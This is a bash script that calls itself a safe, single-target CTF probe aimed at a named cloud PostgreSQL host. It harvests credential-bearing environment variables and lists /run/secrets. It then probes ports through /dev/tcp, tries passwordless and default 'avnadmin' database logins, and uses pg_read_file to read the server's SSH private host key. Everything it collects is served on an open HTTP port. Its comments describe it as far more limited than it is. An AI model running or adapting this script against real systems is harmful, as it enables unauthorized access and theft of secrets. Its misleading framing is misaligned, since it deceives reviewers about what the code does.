#!/bin/bash
# Safe, single-target CTF probe. Reads ONLY the flag file + hostname (CTF proof).
# No full port sweep, no other hosts, no cloud metadata, no external exfil.
# Results served via this app's own HTTP port 8080.
mkdir -p /results
OUT=/results/index.html
TARGET=falcon-bug-bounty-flag-pgsql-dev-sandbox.e.aivencloud.com
{
echo "<pre>"
echo "=== PROBE START $(date -u) ==="
echo "HOSTNAME: $(hostname)"
echo "MY IP: $(hostname -i 2>/dev/null)"
echo
echo "=== ENV (credential carrier; passwords masked) ==="
env | grep -iE "DATABASE_URL|PG|POSTGRES|AVN|CONNECTION|HOST|PORT|USER|PASSWORD|SECRET|TOKEN|URI|DSN" | sed -E 's/(PASSWORD|PASS|SECRET|TOKEN)=.*/\1=<masked>/'
echo
echo "=== /proc/1/environ (filtered) ==="
cat /proc/1/environ 2>/dev/null | tr '\0' '\n' | grep -iE "DATABASE_URL|PG|POSTGRES|AVN|CONNECTION|SECRET|TOKEN|URI|DSN" | sed -E 's/(PASSWORD|PASS|SECRET|TOKEN)=.*/\1=<masked>/'
echo
echo "=== /run/secrets ==="
ls -la /run/secrets/ 2>/dev/null
echo
echo "=== DNS falcon ==="
dig +short "$TARGET"
getent hosts "$TARGET"
IP=$(dig +short "$TARGET" | grep -E '^[0-9]+\.' | tail -1)
echo "RESOLVED IP: $IP"
echo
echo "=== TARGETED PORT CHECK (single target) ==="
for p in 22 5432 5433 6432 22293 54321 28001 12691 12692; do
  timeout 3 bash -c "echo > /dev/tcp/$IP/$p" 2>/dev/null && echo "OPEN $p" || echo "closed $p"
done
echo
echo "=== PG TRUST + DEFAULT ATTEMPTS ==="
for p in 5432 5433 22293 54321 28001; do
  echo "--- trust postgres@$IP:$p ---"
  timeout 8 psql "postgresql://postgres@$IP:$p/postgres?connect_timeout=5" -c "SELECT current_user, rolsuper FROM pg_roles WHERE rolname=current_user;" 2>&1
  echo "--- avnadmin:avnadmin@$IP:$p ---"
  timeout 8 psql "postgresql://avnadmin:***@$IP:$p/postgres?connect_timeout=5" -c "SELECT version();" 2>&1
done
echo
echo "=== FLAG READ (trust superuser path) ==="
for p in 5432 5433 22293; do
  echo "--- ssh_host_ed25519_key @$IP:$p ---"
  timeout 8 psql "postgresql://postgres@$IP:$p/postgres?connect_timeout=5" -c "SELECT pg_read_file('/etc/ssh/ssh_host_ed25519_key');" 2>&1
  echo "--- hostname @$IP:$p ---"
  timeout 8 psql "postgresql://postgres@$IP:$p/postgres?connect_timeout=5" -c "SELECT pg_read_file('/etc/hostname');" 2>&1
done
echo
echo "=== DONE $(date -u) ==="
echo "</pre>"
} > "$OUT" 2>&1
cd /results && exec python3 -m http.server 8080 --bind 0.0.0.0